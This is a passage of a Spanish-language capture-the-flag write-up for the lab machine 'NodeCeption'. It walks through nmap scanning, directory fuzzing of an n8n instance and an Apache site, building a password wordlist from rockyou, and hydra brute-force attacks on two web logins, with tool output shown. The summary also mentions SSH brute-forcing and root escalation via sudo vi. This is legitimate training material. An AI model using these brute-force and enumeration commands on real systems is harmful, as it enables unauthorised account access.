---
title: "NodeCeption - TheHackerLabs"
date: 2025-09-20
draft: false
slug: "THL-writeup-nodeCeption"
excerpt: "Esta fue una máquina sencilla que puede llegar a complicarse un poco. Después de realizar los escaneos, descubrimos un login en la página web activa en el puerto 5678 que resulta ser de la plataforma N8N. En la segunda página web activa en el puerto 8765, descubrimos un mensaje oculto en el código fuente, dándonos una pista sobre un usuario y el formato de la contraseña que debió crear. Aplicamos Fuzzing a ambas páginas, en la primera (donde está la plataforma N8N) no encontramos algo relevante, pero en la segunda, encontramos un login que es muy similar al login de la plataforma N8N. Decidimos aplicar fuerza bruta a ambos logins, siendo el segundo login al que encontramos la contraseña, que al entrar nos da una pista con la que logramos ganar acceso al login de la plataforma N8N. Ya dentro, descubrimos un WorkFlow que logra leer el archivo /etc/passwd, lo que nos permite identificar un usuario de la máquina víctima, al que le aplicamos fuerza bruta y logramos ganar acceso vía SSH. Ya en la máquina víctima, descubrimos que nuestro usuario tiene privilegios sobre el binario vi. Usamos la guía de GTFOBins para encontrar una forma de escalar privilegios, siendo así que nos convertimos en Root."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "SSH", "N8N Platform", "Web Enumeration", "Fuzzing", "BurpSuite", "Brute Force Attack to Web Login", "Analysing WorkFlow from N8N", "Brute Force Attack to SSH", "Abusing Execute Command Node from N8N", "Abusing Sudoers Privileges On vi Binary", "Privesc - Abusing Sudoers Privileges On vi Binary", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "Wappalizer"
  - "ffuf"
  - "gobuster"
  - "grep"
  - "hydra"
  - "BurpSuite"
  - "ssh"
  - "cat"
  - "tcpdump"
  - "ping"
  - "nc"
  - "bash"
  - "sudo"
  - "GTFOBins"
  - "vi"
links:
  - "https://secarius.fr/bugbounty/how_i_found_an_rce_seconds_after_its_publication/"
  - "https://gtfobins.github.io/gtfobins/vi/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-nodeCeption/NodeCeption.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.120
PING 192.168.100.120 (192.168.100.120) 56(84) bytes of data.
64 bytes from 192.168.100.120: icmp_seq=1 ttl=64 time=1.54 ms
64 bytes from 192.168.100.120: icmp_seq=2 ttl=64 time=0.860 ms
64 bytes from 192.168.100.120: icmp_seq=3 ttl=64 time=0.882 ms
64 bytes from 192.168.100.120: icmp_seq=4 ttl=64 time=0.888 ms

--- 192.168.100.120 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3090ms
rtt min/avg/max/mdev = 0.860/1.043/1.543/0.288 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.120 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 11:20 CST
Initiating ARP Ping Scan at 11:20
Scanning 192.168.100.120 [1 port]
Completed ARP Ping Scan at 11:20, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:20
Scanning 192.168.100.120 [65535 ports]
Discovered open port 22/tcp on 192.168.100.120
Discovered open port 5678/tcp on 192.168.100.120
Discovered open port 8765/tcp on 192.168.100.120
Completed SYN Stealth Scan at 11:20, 7.62s elapsed (65535 total ports)
Nmap scan report for 192.168.100.120
Host is up, received arp-response (0.0078s latency).
Scanned at 2025-09-19 11:20:33 CST for 8s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 64
5678/tcp open  rrac           syn-ack ttl 64
8765/tcp open  ultraseek-http syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay 3 puertos abiertos, pero 2 de ellos no los he visto antes.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,5678,8765 192.168.100.120 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 11:21 CST
Nmap scan report for 192.168.100.120
Host is up (0.00086s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 67:df:2b:e6:48:16:ec:91:b1:a6:67:25:37:05:fc:0f (ECDSA)
|_  256 dc:ab:74:b7:be:b5:49:6a:c8:7b:db:6b:7c:91:73:69 (ED25519)
5678/tcp open  rrac?

| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=86400
|     Last-Modified: Fri, 19 Sep 2025 17:14:41 GMT
|     ETag: W/"7b7-19962f890cd"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1975
|     Vary: Accept-Encoding
|     Date: Fri, 19 Sep 2025 17:21:19 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <script type="module" crossorigin src="/assets/polyfills-B8p9DdqU.js"></script>
|     <meta charset="utf-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="viewport" content="width=device-width,initial-scale=1.0" />
|     <link rel="icon" href="/favicon.ico" />
|     <style>@media (prefers-color-scheme: dark) { body { background-color: rgb(45, 46, 46) } }</style>
|     <script type="text/javascript">
|     window.BASE_PATH = '/';
|     window.REST_ENDPOINT = 'rest';
|     </script>
|     <script src="/rest/sentry.js"></script>
|     <script>!function(t,e){var o,n,
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Vary: Accept-Encoding
|     Date: Fri, 19 Sep 2025 17:21:19 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
8765/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))

|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5678-TCP:V=7.95%I=7%D=9/19%Time=68CD910C%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,8DC,"HTTP/1\.1\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nCach
SF:e-Control:\x20public,\x20max-age=86400\r\nLast-Modified:\x20Fri,\x2019\
SF:x20Sep\x202025\x2017:14:41\x20GMT\r\nETag:\x20W/\"7b7-19962f890cd\"\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201975
SF:\r\nVary:\x20Accept-Encoding\r\nDate:\x20Fri,\x2019\x20Sep\x202025\x201
SF:7:21:19\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html
SF:\x20lang=\"en\">\n\t<head>\n\t\t<script\x20type=\"module\"\x20crossorig
SF:in\x20src=\"/assets/polyfills-B8p9DdqU\.js\"></script>\n\n\t\t<meta\x20
SF:charset=\"utf-8\"\x20/>\n\t\t<meta\x20http-equiv=\"X-UA-Compatible\"\x2
SF:0content=\"IE=edge\"\x20/>\n\t\t<meta\x20name=\"viewport\"\x20content=\
SF:"width=device-width,initial-scale=1\.0\"\x20/>\n\t\t<link\x20rel=\"icon
SF:\"\x20href=\"/favicon\.ico\"\x20/>\n\t\t<style>@media\x20\(prefers-colo
SF:r-scheme:\x20dark\)\x20{\x20body\x20{\x20background-color:\x20rgb\(45,\
SF:x2046,\x2046\)\x20}\x20}</style>\n\t\t<script\x20type=\"text/javascript
SF:\">\n\t\t\twindow\.BASE_PATH\x20=\x20'/';\n\t\t\twindow\.REST_ENDPOINT\
SF:x20=\x20'rest';\n\t\t</script>\n\t\t<script\x20src=\"/rest/sentry\.js\"
SF:></script>\n\t\t<script>!function\(t,e\){var\x20o,n,")%r(HTTPOptions,18
SF:3,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20defa
SF:ult-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type
SF::\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nVary:\x20
SF:Accept-Encoding\r\nDate:\x20Fri,\x2019\x20Sep\x202025\x2017:21:19\x20GM
SF:T\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en
SF:\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>
SF:\n<body>\n<pre>Cannot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTS
SF:PRequest,183,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli
SF:cy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r
SF:\nVary:\x20Accept-Encoding\r\nDate:\x20Fri,\x2019\x20Sep\x202025\x2017:
SF:21:19\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x
SF:20lang=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</titl
SF:e>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\x20/</pre>\n</body>\n</html
SF:>\n");
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.32 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

En los puertos desconocidos, tenemos 2 páginas web activas.

Viendo el escaneo de la página web del **puerto 5678**, podemos identificar el endpoint `/rest` que supongo tiene que ver con la tecnología **API REST**.

Del **puerto 8765**, solamente nos muestra la página por defecto de **Apache2**.

Vamos a analizar primero la página web del **puerto 5678** y luego, la página web del **puerto 8765**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Página Web Activa en el Puerto 5678 {#Puerto5678}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura1.png">
</p>

Entramos en un login y vemos que es la plataforma **n8n**.

| **Plataforma n8n** |
|:------------------:|
| *n8n es una plataforma de automatización visual de código abierto para crear flujos de trabajo que conectan aplicaciones y servicios, automatizando así tareas repetitivas y moviendo datos entre ellos, todo ello sin necesidad de codificación y con la opción de autoalojamiento. Es una alternativa a herramientas como Zapier y Make que permite integrar más de 400 aplicaciones y servicios mediante nodos y visualmente, para escalar operaciones empresariales* |

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura2.png">
</p>

Son bastantes las tecnologías que se están usando, pero no veo algo que nos ayude de momento.

Si revisamos el código fuente, veremos el endpoint `/rest` que menciona el escaneo de servicios:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura3.png">
</p>

Al capturar con **BurpSuite** la petición de inicio de sesión del login, veremos otro endpoint y que la data es enviada en formato **JSON**:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura4.png">
</p>

Esto refuerza más el hecho de que nos enfrentamos ante una **API**.

Por último, vemos el mensaje de error ante un inicio de sesión fallido:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura5.png">
</p>

No encontraremos algo más, así que vayamos a analizar la otra página web.

### Analizando Página Web Activa en el Puerto 8765 {#Puerto8765}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura6.png">
</p>

Solamente es la página por defecto de **Apache2**.

Revisando el código fuente, nos encontraremos un mensaje oculto de algún desarrollador:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura7.png">
</p>

Tenemos un posible usuario y una pista sobre la contraseña que debemos usar.

No encontraremos algo más aquí, entonces, aplicaremos **Fuzzing** a ambas páginas para ver qué cosillas encontramos.

### Fuzzing a Página Web del Puerto 5678 {#fuzzPuerto5678}

Usando **ffuf** para descubrir directorios ocultos, solamente encontraremos estos directorios:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.100.120:5678/FUZZ -t 300

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.120:5678/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

static                  [Status: 301, Size: 156, Words: 6, Lines: 11, Duration: 1433ms]
assets                  [Status: 301, Size: 156, Words: 6, Lines: 11, Duration: 2024ms]
types                   [Status: 301, Size: 155, Words: 6, Lines: 11, Duration: 133ms]
                        [Status: 200, Size: 1975, Words: 85, Lines: 32, Duration: 243ms]
:: Progress: [220545/220545] :: Job [1/1] :: 1011 req/sec :: Duration: [0:03:01] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Al intentar entrar a cada uno, nos dirá que no puede por **peticiones GET**:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura8.png">
</p>

Ahora, si enfocamos el **Fuzzing** en el endpoint `/rest`, veremos más directorios que antes, pero no tendremos acceso a estos:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.100.120:5678/rest/FUZZ/ -t 300

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.120:5678/rest/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 49ms]
projects                [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 117ms]
tags                    [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 32ms]
license                 [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 32ms]
Login                   [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 59ms]
users                   [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 775ms]
Projects                [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 137ms]
settings                [Status: 200, Size: 3448, Words: 1, Lines: 1, Duration: 159ms]
LICENSE                 [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 116ms]
Users                   [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 40ms]
License                 [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 160ms]
push                    [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 159ms]
PROJECTS                [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 148ms]
Push                    [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 198ms]
roles                   [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 153ms]
SETTINGS                [Status: 200, Size: 3448, Words: 1, Lines: 1, Duration: 94ms]
variables               [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 88ms]
PUSH                    [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 213ms]
LogIn                   [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 116ms]
Tags                    [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 159ms]
LOGIN                   [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 48ms]
credentials             [Status: 401, Size: 43, Words: 1, Lines: 1, Duration: 135ms]
:: Progress: [220545/220545] :: Job [1/1] :: 913 req/sec :: Duration: [0:03:21] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.100.120:5678/rest -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.120:5678/rest
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/users                (Status: 401) [Size: 43]
/login                (Status: 401) [Size: 43]
/projects             (Status: 401) [Size: 43]
/license              (Status: 401) [Size: 43]
/tags                 (Status: 401) [Size: 43]
/Login                (Status: 401) [Size: 43]
/Projects             (Status: 401) [Size: 43]
/settings             (Status: 200) [Size: 3448]
/LICENSE              (Status: 401) [Size: 43]
/Users                (Status: 401) [Size: 43]
/License              (Status: 401) [Size: 43]
/push                 (Status: 401) [Size: 43]
/PROJECTS             (Status: 401) [Size: 43]
/Push                 (Status: 401) [Size: 43]
/roles                (Status: 401) [Size: 43]
/SETTINGS             (Status: 200) [Size: 3448]
/variables            (Status: 401) [Size: 43]
/PUSH                 (Status: 401) [Size: 43]
/LogIn                (Status: 401) [Size: 43]
/Tags                 (Status: 401) [Size: 43]
/LOGIN                (Status: 401) [Size: 43]
/credentials          (Status: 401) [Size: 43]
Progress: 220544 / 220544 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

En ambos casos se encontraron los mismos endpoints y solamente tendremos acceso al `/settings`:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura9.png">
</p>

Gracias a este endpoint, podemos obtener algunas cosillas como:
* La versión de la **plataforma n8n** que es **1.102.4**.
* La existencia de **API público**, es decir, endpoint `/api` activo.
* La **API Key pública**.

Y otras cosillas más, pero para poder ver otros endpoints, necesitamos estar logueados en la **plataforma n8n**, lo cual aún no es posible.

### Fuzzing a Página Web del Puerto 8765 {#fuzzPuerto8765}

Al no encontrar algún directorio oculto, enfocamos la búsqueda en archivos ocultos:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.100.120:8765/FUZZ -t 300 -e .txt,.html,.php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.120:8765/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .txt .html .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.html              [Status: 200, Size: 10833, Words: 3517, Lines: 369, Duration: 57ms]
login.php               [Status: 200, Size: 1723, Words: 637, Lines: 75, Duration: 9131ms]
.html                   [Status: 403, Size: 282, Words: 20, Lines: 10, Duration: 20ms]
                        [Status: 200, Size: 10833, Words: 3517, Lines: 369, Duration: 20ms]
.php                    [Status: 403, Size: 282, Words: 20, Lines: 10, Duration: 20ms]
server-status           [Status: 403, Size: 282, Words: 20, Lines: 10, Duration: 53ms]
:: Progress: [882180/882180] :: Job [1/1] :: 265 req/sec :: Duration: [0:07:52] :: Errors: 2 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-e*       | Para indicar una busqueda de archivos específicos. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.100.120:8765 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 -x txt,html,php
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.120:8765
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10833]
/login.php            (Status: 200) [Size: 1723]
/server-status        (Status: 403) [Size: 282]
Progress: 882176 / 882176 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*       | Para indicar una busqueda de archivos específicos. |

En ambos casos encontramos un login al que podemos entrar:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura10.png">
</p>

En su código fuente no encontraremos algo relevante, pero si capturamos una petición de inicio de sesión, veremos que hay una relación con el login de la **plataforma n8n**:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura11.png">
</p>

Y, por supuesto, tenemos el mensaje de error:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura12.png">
</p>

Por último, este login no parece ser vulnerable a **Inyecciones SQL**, por lo que sí o sí debemos darle un usuario y contraseña válidos.

Nos queda aplicar fuerza bruta en ambos logins.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta a Cada Login {#FuerzaBruta}

Antes de aplicar la fuerza bruta, debemos crear nuestro wordlist que debe tener las siguientes características:
* Debe tener mínimo 8 caracteres.
* Debe tener al menos una letra mayúscula.
* Debe tener al menos un número.

Podemos usar expresiones regulares contra el wordlist **rockyou.txt**, para obtener un nuevo wordlist que cumpla con estas características.

Lo haremos con el siguiente comando:
```bash
grep -P '^(?=.{8,}$)(?=.*[A-Z])(?=.*\d).*$' /usr/share/wordlists/rockyou.txt > rockyouMatch.txt
```
* `(?=.{8,}$)` asegura que la longitud sea mínima de 8.
* `(?=.*[A-Z])` exige al menos una mayúscula.
* `(?=.*\d)` exige al menos un dígito.

Entonces, para realizar el ataque a cada login, debemos de darle lo siguiente:
* A qué lugar será dirigido el ataque, un servicio, un login web, etc.
* Los parámetros que se usan para enviar el usuario y contraseña.
* Y un filtro que indique un resultado correcto, ya sea que evite resultados con cierto texto, que solo acepte resultados que nos redirijan (obteniendo el código de estado 302), etc. Podemos usar un filtro que evite respuestas que den mensajes de error.

Pero aquí nos enfrentamos a un problema, pues al aplicar la fuerza bruta al login de la página web del **puerto 5678**, nos dará falsos positivos:
```bash
hydra -l 'usuario@maildelctf.com' -P ./rockyouMatch.txt 192.168.100.120 -s 5678 http-form-post "/rest/login:emailOrLdapLoginId=^USER^&password=^PASS^:F=Wrong username or password. Do you have caps lock on?"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-19 15:15:22
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 611309 login tries (l:1/p:611309), ~38207 tries per task
[DATA] attacking http-post-form://192.168.100.120:5678/rest/login:emailOrLdapLoginId=^USER^&password=^PASS^:F=Wrong username or password. Do you have caps lock on?
[5678][http-post-form] host: 192.168.100.120   login: usuario@maildelctf.com   password: BABYGIRL1
[ERROR] the target is using HTTP auth, not a web form, received HTTP error code 401. Use module "http-get" instead.
[ERROR] the target is using HTTP auth, not a web form, received HTTP error code 401. Use module "http-get" instead.
[ERROR] the target is using HTTP auth, not a web form, received HTTP error code 401. Use module "http-get" instead.
[ERROR] the target is using HTTP auth, not a web form, received HTTP error code 401. Use module "http-get" instead.
[5678][http-post-form] host: 192.168.100.120   login: usuario@maildelctf.com   password: Blink182
[ERROR] the target is using HTTP auth, not a web form, received HTTP error code 401. Use module "http-get" instead.
[5678][http-post-form] host: 192.168.100.120   login: usuario@maildelctf.com   password: P@ssw0rd
[5678][http-post-form] host: 192.168.100.120   login: usuario@maildelctf.com   password: Password1
[5678][http-post-form] host: 192.168.100.120   login: usuario@maildelctf.com   password: Michael1
[5678][http-post-form] host: 192.168.100.120   login: usuario@maildelctf.com   password: !QAZ2wsx
[5678][http-post-form] host: 192.168.100.120   login: usuario@maildelctf.com   password: PRINCESS1
[5678][http-post-form] host: 192.168.100.120   login: usuario@maildelctf.com   password: Princess1
[5678][http-post-form] host: 192.168.100.120   login: usuario@maildelctf.com   password: ANTHONY1
[5678][http-post-form] host: 192.168.100.120   login: usuario@maildelctf.com   password: ILOVEYOU1
[5678][http-post-form] host: 192.168.100.120   login: usuario@maildelctf.com   password: ILOVEYOU2
[5678][http-post-form] host: 192.168.100.120   login: usuario@maildelctf.com   password: Charlie1
[5678][http-post-form] host: 192.168.100.120   login: usuario@maildelctf.com   password: MYSPACE1
[5678][http-post-form] host: 192.168.100.120   login: usuario@maildelctf.com   password: PASSWORD1
[5678][http-post-form] host: 192.168.100.120   login: usuario@maildelctf.com   password: Passw0rd
[5678][http-post-form] host: 192.168.100.120   login: usuario@maildelctf.com   password: JORDAN23
1 of 1 target successfully completed, 16 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-19 15:15:33
```

Además, el aplicar fuerza bruta puede desactivar el login, pues detectará muchas peticiones realizadas, lo que me da a entender que hay un límite de intentos:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura13.png">
</p>

En cambio, la fuerza bruta se podrá aplicar en el login de la página web del **puerto 8765**, sin ningún problema:
```bash
hydra -l 'usuario@maildelctf.com' -P ./rockyouMatch.txt 192.168.100.120 -s 8765 http-post-form "/login.php:email=^USER^&password=^PASS^:F=Credenciales incorrectas."
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-19 15:09:20
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 611309 login tries (l:1/p:611309), ~38207 tries per task
[DATA] attacking http-post-form://192.168.100.120:8765/login.php:email=^USER^&password=^PASS^:F=Credenciales incorrectas.
[8765][http-post-form] host: 192.168.100.120   login: usuario@maildelctf.com   password: ********
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-19 15:09:31
```

Y si probamos esa contraseña, nos darán un mensaje interesante:

<p align="center">
<img src="/assets/images/THL-writeup-nodeCeption/Captura14.png">
</p>

Esta contraseña nos servirá para ganar acceso al login de la **plataforma n8n**:

<p align="center">
